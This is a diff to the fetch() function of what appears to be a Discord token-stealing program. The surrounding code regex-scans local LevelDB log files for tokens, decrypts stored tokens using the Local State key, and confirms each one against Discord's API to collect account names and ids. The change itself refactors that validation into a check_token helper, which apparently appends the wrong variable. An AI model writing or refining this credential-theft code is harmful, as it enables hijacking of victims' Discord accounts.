@@ -62,6 +62,17 @@ def fetch():
         try: return req.json()
         except: return json.loads(brotli.decompress(req.content).decode("utf-8"))
     
+    def check_token(tkn, name, ids:list, to_return_tokens:list):
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(tkn))
+        if r.status_code == 200:
+            tknid = base64.b64encode(tkn.split('.')[0].encode('ascii')).decode('ascii')
+            if (tknid+name) not in ids:
+                req = reqJSON(r)
+                to_return_tokens.append([token, f"{req['username']}#{req['discriminator']}", tkn.split('.')[0], name])
+                ids.append(tknid+name)
+
+        return ids, to_return_tokens
+    
     to_return_tokens = []
     ids = []
 
@@ -108,12 +119,7 @@ def fetch():
                                     y.split('dQw4w9WgXcQ:')[1]), get_decryption_key(roaming+f'\\{disc}\\Local State'))
                             except: pass
                             else:
-                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
-                                if r.status_code == 200:
-                                    tknid = reqJSON(r)["id"]
-                                    if tknid not in ids:
-                                        to_return_tokens.append([token, f"{reqJSON(r)['username']}#{reqJSON(r)['discriminator']}", tknid])
-                                        ids.append(tknid)
+                                ids, to_return_tokens = check_token(token, name, ids, to_return_tokens)
         else:
             for file_name in os.listdir(path):
                 if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
@@ -121,11 +127,6 @@ def fetch():
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                     for reg in (regex):
                         for token in re.findall(reg, line):
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
-                            if r.status_code == 200:
-                                tknid = reqJSON(r)["id"]
-                                if tknid not in ids:
-                                    to_return_tokens.append([token, f"{reqJSON(r)['username']}#{reqJSON(r)['discriminator']}", tknid])
-                                    ids.append(tknid)
+                            ids, to_return_tokens = check_token(token, name, ids, to_return_tokens)
                 
     return to_return_tokens
